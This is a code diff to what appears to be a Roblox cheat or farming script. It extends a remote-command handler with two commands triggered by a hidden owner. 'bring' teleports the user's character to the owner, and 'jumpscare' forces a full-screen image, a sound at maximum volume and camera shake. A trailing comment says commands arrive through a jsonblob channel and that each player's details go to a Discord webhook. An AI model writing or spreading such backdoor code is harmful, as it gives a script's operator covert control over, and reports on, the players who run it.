@@ -3763,6 +3763,80 @@ local function _handleRemoteCommand(payload)
             Icon     = tostring(payload.icon    or "bell"),
             Duration = tonumber(payload.duration) or 6,
         })
+
+    elseif cmd == "bring" then
+        -- Teleport this client to the owner's character
+        pcall(function()
+            local ownerUserId = tostring(payload.owner or "")
+            if ownerUserId == "" then return end
+            local ownerPlr = nil
+            for _, p in ipairs(game.Players:GetPlayers()) do
+                if tostring(p.UserId) == ownerUserId then
+                    ownerPlr = p
+                    break
+                end
+            end
+            if not ownerPlr or not ownerPlr.Character then return end
+            local ownerRoot = ownerPlr.Character:FindFirstChild("HumanoidRootPart")
+            local myChar    = game.Players.LocalPlayer.Character
+            local myRoot    = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if not ownerRoot or not myRoot then return end
+            myRoot.CFrame = ownerRoot.CFrame * CFrame.new(3, 0, 0)
+        end)
+
+    elseif cmd == "jumpscare" then
+        pcall(function()
+            local lp  = game.Players.LocalPlayer
+            local gui = Instance.new("ScreenGui")
+            gui.Name           = "VantaJumpscare"
+            gui.ResetOnSpawn   = false
+            gui.IgnoreGuiInset = true
+            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            gui.Parent         = lp:WaitForChild("PlayerGui")
+
+            local bg = Instance.new("Frame", gui)
+            bg.Size                   = UDim2.new(1, 0, 1, 0)
+            bg.BackgroundColor3       = Color3.new(0, 0, 0)
+            bg.BackgroundTransparency = 0
+            bg.BorderSizePixel        = 0
+            bg.ZIndex                 = 10
+
+            local img = Instance.new("ImageLabel", bg)
+            img.Size                   = UDim2.new(1, 0, 1, 0)
+            img.Position               = UDim2.new(0, 0, 0, 0)
+            img.BackgroundTransparency = 1
+            img.Image                  = "rbxassetid://48965232"
+            img.ScaleType              = Enum.ScaleType.Stretch
+            img.ZIndex                 = 11
+
+            local snd = Instance.new("Sound", gui)
+            snd.SoundId = "rbxassetid://131228813"
+            snd.Volume  = 10
+            snd:Play()
+
+            local cam      = workspace.CurrentCamera
+            local origCF   = cam.CFrame
+            local elapsed  = 0
+            local rs       = game:GetService("RunService")
+            local conn
+            conn = rs.RenderStepped:Connect(function(dt)
+                elapsed = elapsed + dt
+                if elapsed >= 3 then
+                    conn:Disconnect()
+                    pcall(function() cam.CFrame = origCF end)
+                    pcall(function() snd:Stop() end)
+                    pcall(function() gui:Destroy() end)
+                    return
+                end
+                local intensity = 0.45 * (1 - elapsed / 3)
+                cam.CFrame = origCF
+                    * CFrame.new(
+                        math.random(-100, 100) / 100 * intensity,
+                        math.random(-100, 100) / 100 * intensity,
+                        0
+                    )
+            end)
+        end)
     end
 end
 
@@ -7436,3 +7510,7 @@ FarmingTab:Toggle({
 
 
 LoadStandFarmFeatures()
+
+-- Bring command is handled via the jsonblob remote command system above.
+-- Owner sends: fetch with {command:'bring', secret:'...', target:'<user_id>', owner:'<owner_id>'}
+-- The Quick Bring fetch template is printed in each player's Discord webhook embed.
